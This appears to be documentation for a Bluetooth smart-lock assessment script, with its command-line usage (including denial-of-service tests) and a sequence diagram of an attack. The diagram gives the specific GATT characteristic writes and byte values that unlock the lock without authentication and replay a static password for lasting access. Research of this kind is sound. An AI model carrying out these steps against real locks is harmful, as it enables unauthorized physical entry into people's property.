```
If you are using ble_assessment.py

# Discover devices
python3 ble_assessment.py --discover

# Run all tests on a device
python3 ble_assessment.py -m 20:C3:8F:D9:3C:7C

# Run specific tests
python3 ble_assessment.py -m 20:C3:8F:D9:3C:7C --tests auth,dos

# Custom output directory
python3 ble_assessment.py -m 20:C3:8F:D9:3C:7C --output my_reports
```

## Smart Lock Attack Flow (BLE)

```mermaid
sequenceDiagram
    participant A as Attacker
    participant L as Smart Lock (FFD0)
    participant U as Legitimate User

    Note over A,L: Reconnaissance Phase
    A->>L: BLE Scan (0xFFD0 service)
    L-->>A: Device Advertisement

    A->>L: GATT Connect
    A->>L: Enumerate Characteristics
    L-->>A: FFD6, FFD7, FFD8, FFD9, FFDA

    Note right of L: ⚠️ No BLE pairing required

    Note over A,L: Vulnerability Testing
    A->>L: Write to FFD8 (0x03)\nSkip authentication test
    L-->>A: Write Accepted

    A->>L: Write to FFD9 (0x01)\nUnlock without password
    L-->>A: 🔓 UNLOCKED

    Note right of L: 🚨 CRITICAL: Auth bypass!

    Note over A,L: Exploitation Phase
    A->>L: Write FFD6: 00 12 34 56 78 00 00 00 00\nSend password
    L-->>A: FFD7 Notification: 01 FF\nAuth success

    A->>L: Write FFD8: 0x03\nSet open time
    A->>L: Write FFD9: 0x01\nExecute unlock
    L-->>A: Motor Activation

    Note right of L: ✓ Physical unlock achieved

    Note over A,U: Persistent Access Phase
    A->>L: Replay: FFD6 + FFD8 + FFD9\nSame credentials work indefinitely
    L-->>A: 🔓 Unlocked again

    Note right of L: Static password allows unlimited replays

    U->>L: BLE Connection
    L-->>U: Already Unlocked

    Note right of U: User unaware of unauthorized access
